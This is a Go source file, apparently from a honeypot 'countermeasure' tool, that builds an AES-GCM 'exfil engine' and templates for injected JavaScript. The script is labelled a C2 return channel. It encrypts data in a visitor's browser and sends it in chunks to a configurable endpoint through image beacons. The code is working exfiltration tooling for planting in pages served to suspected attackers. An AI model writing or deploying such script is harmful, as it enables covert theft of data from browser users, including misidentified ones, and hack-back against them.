package countermeasure

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"io"
)

// ExfilEngine 加密外传引擎
// AES-GCM 加密所有反制数据
type ExfilEngine struct {
	aesKey []byte // 32 bytes for AES-256
}

// NewExfilEngine 创建外传引擎
func NewExfilEngine(keyHex string) *ExfilEngine {
	key := []byte(keyHex)
	// 确保密钥为32字节
	if len(key) < 32 {
		padded := make([]byte, 32)
		copy(padded, key)
		for i := len(key); i < 32; i++ {
			padded[i] = byte(i)
		}
		key = padded
	}
	return &ExfilEngine{aesKey: key[:32]}
}

// Encrypt AES-256-GCM 加密
func (e *ExfilEngine) Encrypt(plaintext []byte) (string, error) {
	block, err := aes.NewCipher(e.aesKey)
	if err != nil {
		return "", fmt.Errorf("aes cipher: %w", err)
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", fmt.Errorf("gcm: %w", err)
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return "", fmt.Errorf("nonce: %w", err)
	}

	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
	return base64.StdEncoding.EncodeToString(ciphertext), nil
}

// Decrypt AES-256-GCM 解密
func (e *ExfilEngine) Decrypt(encoded string) ([]byte, error) {
	ciphertext, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return nil, fmt.Errorf("base64 decode: %w", err)
	}

	block, err := aes.NewCipher(e.aesKey)
	if err != nil {
		return nil, fmt.Errorf("aes cipher: %w", err)
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("gcm: %w", err)
	}

	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}

	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil, fmt.Errorf("gcm open: %w", err)
	}

	return plaintext, nil
}

// EncryptB64 AES-GCM 加密后 Base64（兼容 JS Web Crypto）
func (e *ExfilEngine) EncryptB64(message string) (string, error) {
	return e.Encrypt([]byte(message))
}

// TransferTemplate JS 加密回传模板
// 使用 SubtleCrypto API + Image Beacon 实现浏览器端 AES 加密数据回传
func TransferTemplate(endpoint string) string {
	return fmt.Sprintf(`<script>
// Laji-HoneyPot C2 加密回传通道
(function(){
var EXFIL={endpoint:'%s',key:null,iv:null};
// 初始化 AES-GCM 密钥（Web Crypto）
async function initCrypto(seed){
  var enc=new TextEncoder();
  var keyMaterial=await crypto.subtle.importKey('raw',enc.encode(seed.padEnd(32,'0')),'PBKDF2',false,['deriveKey']);
  EXFIL.key=await crypto.subtle.deriveKey(
    {name:'PBKDF2',salt:enc.encode('laji-honeypot-salt'),iterations:100000,hash:'SHA-256'},
    keyMaterial,{name:'AES-GCM',length:256},false,['encrypt']);
  EXFIL.iv=crypto.getRandomValues(new Uint8Array(12))
}

// 加密并回传
async function exfil(data){
  if(!EXFIL.key){await initCrypto('laji-honeypot-key-2025')}
  var enc=new TextEncoder();
  var ct=await crypto.subtle.encrypt({name:'AES-GCM',iv:EXFIL.iv},EXFIL.key,enc.encode(JSON.stringify(data)));
  // 组合 iv + ciphertext
  var combined=new Uint8Array(EXFIL.iv.length+ct.byteLength);
  combined.set(EXFIL.iv);combined.set(new Uint8Array(ct),EXFIL.iv.length);
  // Base64 编码
  var b64=btoa(String.fromCharCode.apply(null,combined));
  // 分片回传（避免 URL 超长）
  var chunkSize=1800,offset=0;
  while(offset<b64.length){
    var chunk=b64.substring(offset,offset+chunkSize);
    new Image().src=EXFIL.endpoint+'?d='+encodeURIComponent(chunk)+'&s='+offset+'&t='+b64.length;
    offset+=chunkSize
  }
}
window._laji_exfil=exfil;
})();</script>`, endpoint)
}

// ExfilCollectEndpoint 外传数据接收端点 JS（内联于 payload 尾部）
func ExfilCollectScript(endpoint string) string {
	return fmt.Sprintf(`<script>
// 数据外传接收标记
(function(){window._LAJI_C2='%s';})();
</script>`, endpoint)
}
